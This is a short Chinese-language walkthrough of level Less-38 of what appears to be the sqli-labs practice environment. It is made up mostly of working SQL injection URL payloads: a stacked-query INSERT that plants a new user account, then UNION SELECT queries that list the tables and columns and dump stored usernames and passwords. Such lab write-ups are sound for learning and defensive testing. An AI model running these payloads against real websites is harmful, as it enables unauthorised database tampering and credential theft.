# Less-38

这一关其实就是单引号闭合，使用正常单引号闭合就可以进行注入，不过这里可以有另外一种注入就是堆叠注入，因为存在`mysqli_multi_query`函数，该函数支持多条`sql`语句同时进行

~~~ cmd
?id=1%27;insert%20into%20users(id,username,password)%20values%20(%2738%27,%27less38%27,%27hello%27)--+
#向数据表插入自己的账户密码
~~~

![Less-38-01](.\img\Less-38-01.png)

 

~~~ cmd
?id=38
~~~

![Less-38-02](.\img\Less-38-02.png)





~~~ cmd
?id=-1%27%20union%20select%201,2,3--+
~~~

![Less-38-03](.\img\Less-38-03.png)



~~~ cmd
?id=-1%27%20union%20select%201,version(),database()--+
~~~

![Less-38-04](.\img\Less-38-04.png)



~~~ cmd
?id=-1%27%20union%20select%201,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
~~~

![Less-38-05](.\img\Less-38-05.png)



~~~ cmd
?id=-1%27%20union%20select%201,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
~~~

![Less-38-06](.\img\Less-38-06.png)



~~~ cmd
?id=-1%27%20union%20select%201,2,group_concat(username,password) from users--+
~~~

![Less-38-07](.\img\Less-38-07.png)